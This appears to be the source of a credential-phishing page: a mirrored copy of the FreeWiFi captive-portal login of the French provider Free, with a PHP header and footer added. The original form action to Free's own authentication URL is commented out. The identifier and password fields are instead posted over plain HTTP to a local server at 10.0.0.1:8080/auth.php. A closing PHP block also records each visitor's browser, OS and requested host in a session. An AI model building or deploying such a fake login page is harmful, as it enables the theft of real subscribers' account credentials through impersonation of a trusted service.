<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<? require("ua-parser-master/php/uaparser.php"); ?>
<!-- Mirrored from wifi.free.fr/ by HTTrack Website Copier/3.x [XR&CO'2006], Wed, 13 Mar 2013 22:57:03 GMT -->
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<meta name="viewport" content="width=400, user-scalable = no" />
<title></title>
<link rel="stylesheet" type="text/css" href="css/small.css" media="screen" />
</head>
<body>
<div id="header">
  <div id="header_c">
    <div id="top">
      <div id="top-menu"><img src="im/logo2.png" width="232" height="112" alt="Free" /></div>
    </div>
  </div>
  <div class="clearer"></div>
</div>
<div id="bod">
  <div id="bod_c">
    <div id="block">
      <h1>CONNEXION AU SERVICE <span class="red">FreeWiFi</span></h1>
      <br />
      <div id="block_2">
        <p >Pour vous connecter au service FreeWiFi, <br />
          utilisez les identifiants que vous avez configurés lors de votre premier accès au service<br />
	
	 <!-- <form id="form1" name="form1" method="post" action="https://wifi.free.fr/Auth"> -->
	<form id="form1" name="form1" method="post" action="http://10.0.0.1:8080/auth.php">
          <label for="login" class="label" > IDENTIFIANT</label>
          <input name="login" id="login"  class="input_r" value=""/>
          <br />
          <br />
          <br />
          <label for="password" class="label" > MOT DE PASSE</label>
          <input type="password" name="password" id="password" class="input_r" value=""/>
          <br />
          <br />
          <br />
<!--          <a href="#" class="label" style="padding-top:0px;"><img src="/im/help.png" alt="ASSISTANCE" width="37" height="40" border="0"  /></a>
-->
<!--	  <input name="priv" id="priv" type="hidden"  value="" /> -->
          <input name="submit" type="submit" value="Valider" class="input_b" />
        </form>
        
     
         <div class="clearer"></div> 
      </div>

      <a href="indexc838.html?priv=$PRIV_SUB"><img src="im/abo.jpg" alt="Vous n'êtes pas abonné FREE? Cliquez ici et dans une minute, vous pourrez accéder à internet" width="399" height="70" border="0" /></a></div>
  </div>
</div>
</body>

<!-- Mirrored from wifi.free.fr/ by HTTrack Website Copier/3.x [XR&CO'2006], Wed, 13 Mar 2013 22:57:42 GMT -->
</html>

	<?
		session_start ();
		if (isset($_SERVER['HTTP_USER_AGENT'])) {
			$userAgent = $_SERVER['HTTP_USER_AGENT'];
			$parser = new UAParser;
			$resultUserAgent = $parser->parse($userAgent);
		
			# test affichage
		 	# echo "\n\nBrowser: " . $resultUserAgent->ua->family . "\nVersion: " . $resultUserAgent->ua->toVersionString . "OS: " . $resultUserAgent->os->family;
		
			$_SESSION['UserAgent'] = $resultUserAgent->ua->family . ":" . $resultUserAgent->ua->toVersionString . "," . $resultUserAgent->os->family . ":" . $resultUserAgent->os->toVersionString;
		}

		if (isset($_SERVER['HTTP_HOST'])) {
			$_SESSION['url'] = $_SERVER['HTTP_HOST'];
		}
		
		
	?>
